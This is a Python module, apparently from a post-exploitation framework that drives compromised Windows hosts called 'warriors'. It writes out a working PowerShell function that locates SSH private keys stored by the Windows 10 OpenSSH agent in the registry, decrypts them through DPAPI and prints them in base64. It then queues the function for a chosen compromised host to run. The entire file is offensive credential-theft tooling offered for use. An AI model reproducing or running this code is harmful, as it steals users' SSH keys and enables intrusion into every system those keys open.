from termcolor import colored, cprint
from warrior_check import exist_warrior
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Extract SSH Private Keys Windows10",
                       "Description": "Extract SSH Private Keys in Windows10. The registry path is HKCU:\Software\OpenSSH\Agent\Keys",
                       "Author": "@pablogonzalezpe"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        if exist_warrior(self.args["warrior"]):
            function = """function extract-sshprivatekey{
    
    Add-Type -AssemblyName System.Security

    if(Test-Path 'HKCU:\Software\OpenSSH\Agent\keys\')
    {
        $list = (Get-ChildItem HKCU:\Software\OpenSSH\Agent\Keys\).name
        foreach($i in $list)
        {
            $p = $i.Replace("HKEY_CURRENT_USER","hkcu:")
            $comment = (Get-ItemProperty -Path $p).comment
            $comment = [System.Text.Encoding]::ASCII.GetString($comment)
            echo "Name SSH Key: $comment"
            echo " "
            $key = (Get-ItemProperty -Path $p).'(Default)'
            $bytesUnProtect = [Security.Cryptography.ProtectedData]::Unprotect($key,$null,'CurrentUser')
            [System.Convert]::ToBase64String($bytesUnProtect)
            echo " "
        }
    }

}

"""
            function += "extract-sshprivatekey"

            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
                f.write(function)

            cprint ('[+] Done!', 'green')

        else:
            cprint ('[!] Failed... Warrior don´t found', 'red')
